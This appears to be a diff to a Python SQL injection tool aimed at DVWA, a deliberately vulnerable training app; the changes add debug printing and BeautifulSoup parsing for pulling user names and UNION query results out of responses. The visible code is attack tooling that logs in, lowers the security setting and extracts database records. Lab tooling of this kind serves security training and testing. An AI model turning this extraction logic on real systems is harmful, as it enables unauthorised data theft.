@@ -1,11 +1,12 @@
 """
-SQL Injection Attack Module
-Performs REAL SQL injection attacks against DVWA with actual data extraction
+SQL Injection Attack Module - FIXED
+Performs REAL SQL injection attacks against DVWA with improved data extraction
 """
 import time
 import requests
 from datetime import datetime
 import re
+from bs4 import BeautifulSoup
 
 class SQLInjectionAttack:
     def __init__(self, target, parameters):
@@ -50,7 +51,7 @@ class SQLInjectionAttack:
         auth_success = self._authenticate_dvwa()
         if auth_success:
             yield {
-                'message': '🔐 Successfully authenticated with DVWA',
+                'message': '🔑 Successfully authenticated with DVWA',
                 'progress': 10,
                 'status': 'authenticated'
             }
@@ -91,6 +92,12 @@ class SQLInjectionAttack:
                 
                 # Send attack request
                 response = self.session.get(inject_url, timeout=5)
+                
+                # Debug: Save response for analysis
+                print(f"\n[DEBUG] Payload: {payload}")
+                print(f"[DEBUG] URL: {inject_url}")
+                print(f"[DEBUG] Response Status: {response.status_code}")
+                print(f"[DEBUG] Response Length: {len(response.text)}")
                 
                 # Analyze response
                 vulnerability_found, extracted_data = self._analyze_response(response, payload)
@@ -146,6 +153,7 @@ class SQLInjectionAttack:
                     'packets_sent': attempts
                 }
             except Exception as e:
+                print(f"[DEBUG] Error: {e}")
                 yield {
                     'message': f'❌ Error: {str(e)[:50]}',
                     'progress': 10 + int((i + 1) / total_payloads * 70),
@@ -193,13 +201,15 @@ class SQLInjectionAttack:
             self.session.get(f"{base_url}/security.php?security=low&seclev_submit=Submit", timeout=5)
             
             self.dvwa_authenticated = True
+            print("[DEBUG] DVWA authentication successful")
             return True
             
         except Exception as e:
+            print(f"[DEBUG] DVWA authentication failed: {e}")
             return False
     
     def _analyze_response(self, response, payload):
-        """Analyze response for SQL injection success and extract data"""
+        """Analyze response for SQL injection success and extract data - IMPROVED"""
         html = response.text
         html_lower = html.lower()
         
@@ -207,36 +217,48 @@ class SQLInjectionAttack:
         vulnerability_found = False
         extracted_data = []
         
-        # Method 1: Count database records
+        # Method 1: Count database records (DVWA specific)
         first_name_count = html_lower.count('first name:')
         surname_count = html_lower.count('surname:')
+        
+        print(f"[DEBUG] First name count: {first_name_count}, Surname count: {surname_count}")
         
         if first_name_count > 1 or surname_count > 1:
             vulnerability_found = True
             
-            # Extract actual data
-            extracted_data = self._extract_user_data(html)
+            # Extract actual data using BeautifulSoup
+            extracted_data = self._extract_user_data_improved(html)
+            print(f"[DEBUG] Extracted {len(extracted_data)} users")
         
         # Method 2: Check for SQL errors
         if not vulnerability_found:
             if any(err in html_lower for err in ['sql', 'mysql', 'syntax error', 'database']):
                 vulnerability_found = True
+                print("[DEBUG] SQL error detected in response")
         
         # Method 3: Check for UNION SELECT success
         if 'union' in payload.lower() and len(html) > 500:
             vulnerability_found = True
-            extracted_data = self._extract_union_data(html)
+            if not extracted_data:
+                extracted_data = self._extract_union_data(html)
+            print(f"[DEBUG] UNION injection detected, extracted {len(extracted_data)} items")
         
         return vulnerability_found, extracted_data
     
-    def _extract_user_data(self, html):
-        """Extract user data from DVWA response"""
+    def _extract_user_data_improved(self, html):
+        """Extract user data from DVWA response - IMPROVED with BeautifulSoup"""
         users = []
         
         try:
-            # Pattern: ID: X<br />First name: Y<br />Surname: Z
-            pattern = r'ID:\s*(\d+)<br\s*/?>First name:\s*([^<]+)<br\s*/?>Surname:\s*([^<]+)'
-            matches = re.findall(pattern, html, re.IGNORECASE)
+            # Try BeautifulSoup parsing first
+            soup = BeautifulSoup(html, 'html.parser')
+            
+            # Find all text content
+            text_content = soup.get_text()
+            
+            # Pattern: ID: X First name: Y Surname: Z
+            pattern = r'ID:\s*(\d+)\s+First name:\s*([^\n]+)\s+Surname:\s*([^\n]+)'
+            matches = re.findall(pattern, text_content, re.IGNORECASE)
             
             for match in matches:
                 users.append({
@@ -245,52 +267,92 @@ class SQLInjectionAttack:
                     'surname': match[2].strip()
                 })
             
-            # Alternative pattern if first doesn't work
+            print(f"[DEBUG] Regex matches found: {len(matches)}")
+            
+            # If that didn't work, try HTML parsing
             if not users:
-                lines = html.split('<br')
-                current_record = {}
+                # Look for pre or div elements containing results
+                for element in soup.find_all(['pre', 'div', 'p']):
+                    text = element.get_text()
+                    if 'ID:' in text and 'First name:' in text:
+                        lines = text.split('\n')
+                        current_user = {}
+                        
+                        for line in lines:
+                            line = line.strip()
+                            if line.startswith('ID:'):
+                                if current_user:
+                                    users.append(current_user)
+                                current_user = {'id': line.replace('ID:', '').strip()}
+                            elif line.startswith('First name:'):
+                                current_user['first_name'] = line.replace('First name:', '').strip()
+                            elif line.startswith('Surname:'):
+                                current_user['surname'] = line.replace('Surname:', '').strip()
+                        
+                        if current_user and 'first_name' in current_user:
+                            users.append(current_user)
+            
+            # Last resort: regex on raw HTML
+            if not users:
+                pattern = r'ID:\s*(\d+)<br\s*/?>First name:\s*([^<]+)<br\s*/?>Surname:\s*([^<]+)'
+                matches = re.findall(pattern, html, re.IGNORECASE)
                 
-                for line in lines:
-                    if 'ID:' in line:
-                        if current_record:
-                            users.append(current_record)
-                        current_record = {'id': re.search(r'ID:\s*(\d+)', line).group(1) if re.search(r'ID:\s*(\d+)', line) else 'unknown'}
-                    elif 'First name:' in line:
-                        fname = re.search(r'First name:\s*([^<]+)', line)
-                        if fname:
-                            current_record['first_name'] = fname.group(1).strip()
-                    elif 'Surname:' in line:
-                        sname = re.search(r'Surname:\s*([^<]+)', line)
-                        if sname:
-                            current_record['surname'] = sname.group(1).strip()
-                
-                if current_record and 'first_name' in current_record:
-                    users.append(current_record)
+                for match in matches:
+                    users.append({
+                        'id': match[0].strip(),
+                        'first_name': match[1].strip(),
+                        'surname': match[2].strip()
+                    })
             
         except Exception as e:
-            pass
+            print(f"[DEBUG] Extraction error: {e}")
         
         return users
     
     def _extract_union_data(self, html):
-        """Extract data from UNION SELECT results"""
+        """Extract data from UNION SELECT results - IMPROVED"""
         data = []
         
         try:
-            # Look for concatenated results
-            lines = html.split('<br')
-            for line in lines:
-                # Remove HTML tags
-                clean = re.sub('<[^<]+?>', '', line)
-                clean = clean.strip()
-                
-                if clean and len(clean) > 2 and clean not in ['ID:', 'First name:', 'Surname:']:
-                    data.append({'extracted_value': clean})
+            soup = BeautifulSoup(html, 'html.parser')
+            
+            # Look for pre tags containing results
+            for pre in soup.find_all('pre'):
+                text = pre.get_text().strip()
+                if text and len(text) > 2:
+                    # Split by newlines or breaks
+                    lines = text.split('\n')
+                    for line in lines:
+                        line = line.strip()
+                        if line and not line.startswith('ID:') and not line.startswith('First name:'):
+                            # This might be extracted data
+                            if len(line) > 3 and len(line) < 100:
+                                data.append({'extracted_value': line})
+            
+            # Also check divs
+            if not data:
+                for div in soup.find_all('div'):
+                    text = div.get_text().strip()
+                    lines = text.split('\n')
+                    for line in lines:
+                        line = line.strip()
+                        if line and 'first name' not in line.lower() and 'surname' not in line.lower():
+                            if 5 < len(line) < 100:
+                                data.append({'extracted_value': line})
         
-        except:
-            pass
+        except Exception as e:
+            print(f"[DEBUG] Union extraction error: {e}")
         
-        return data
+        # Remove duplicates and filter garbage
+        seen = set()
+        filtered_data = []
+        for item in data:
+            val = item['extracted_value']
+            if val not in seen and not val.startswith('<') and not val.startswith('>'):
+                seen.add(val)
+                filtered_data.append(item)
+        
+        return filtered_data[:10]  # Limit to first 10 unique items
     
     def get_results(self):
         """Get attack results"""
